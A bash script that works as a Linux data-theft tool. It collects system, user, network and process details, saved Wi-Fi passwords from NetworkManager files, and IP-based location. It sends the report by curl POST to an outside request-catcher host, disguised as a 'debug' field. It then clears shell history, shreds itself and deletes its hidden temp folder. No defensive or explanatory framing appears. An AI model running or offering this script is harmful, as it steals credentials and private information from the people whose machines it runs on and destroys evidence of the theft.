#!/bin/bash

# === Temporary work folder ===
TMPDIR="/tmp/.sysdata"
mkdir -p "$TMPDIR"
cd "$TMPDIR" || exit 1

# === Data collection ===
collect_info() {
os_info=$(lsb_release -a 2>/dev/null)
kernel_info=$(uname -a)
hostname_info=$(hostnamectl)
current_user=$(whoami)
public_ip=$(curl -s https://ipinfo.io/ip)
local_ip=$(hostname -I)
mac_address=$(ip link | grep -A1 "state UP" | grep ether | awk '{print $2}')
wifi_networks=$(nmcli -f SSID,BSSID,SIGNAL dev wifi list 2>/dev/null)
wifi_profiles=$(grep -r '^psk=' /etc/NetworkManager/system-connections/ 2>/dev/null)
location_data=$(curl -s https://ipinfo.io/loc)
user_list=$(cut -d: -f1 /etc/passwd)
group_info=$(groups)
password_policy=$(chage -l "$current_user" 2>/dev/null)
running_processes=$(ps aux)
enabled_services=$(systemctl list-unit-files --type=service --state=enabled)
installed_software=$(dpkg-query -W -f='${binary:Package} ${Version}\n')
disk_info=$(lsblk)
serial_devices=$(dmesg | grep tty)
tcp_connections=$(ss -tunapl)

# === Report ===
cat <<EOF > "$TMPDIR/report.txt"
==== [OS INFO] ====
$os_info

==== [KERNEL] ====
$kernel_info

==== [HOSTNAME] ====
$hostname_info

==== [CURRENT USER] ====
$current_user

==== [PUBLIC IP] ====
$public_ip

==== [LOCAL IP] ====
$local_ip

==== [MAC ADDRESS] ====
$mac_address

==== [WIFI NETWORKS] ====
$wifi_networks

==== [WIFI PROFILES & PASSWORDS] ====
$wifi_profiles

==== [LOCATION (IP-BASED)] ====
$location_data

==== [USER LIST] ====
$user_list

==== [GROUP INFO] ====
$group_info

==== [PASSWORD POLICY] ====
$password_policy

==== [PROCESSES] ====
$running_processes

==== [SERVICES] ====
$enabled_services

==== [SOFTWARE] ====
$installed_software

==== [DISK INFO] ====
$disk_info

==== [SERIAL DEVICES] ====
$serial_devices

==== [TCP CONNECTIONS] ====
$tcp_connections
EOF
}

# === Send Report ===
exfiltrate() {
curl -s -X POST https://flipped.requestcatcher.com \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "debug=$(cat "$TMPDIR/report.txt")" >/dev/null 2>&1
}

# === Clean up ===
cleanup() {
  history -c
  unset HISTFILE
  shred -u "$0" 2>/dev/null || rm -f "$0"
  shred -u "$TMPDIR/report.txt" 2>/dev/null
  rm -rf "$TMPDIR"
}

# === Execution ===
collect_info
exfiltrate
cleanup &
disown
exit 0
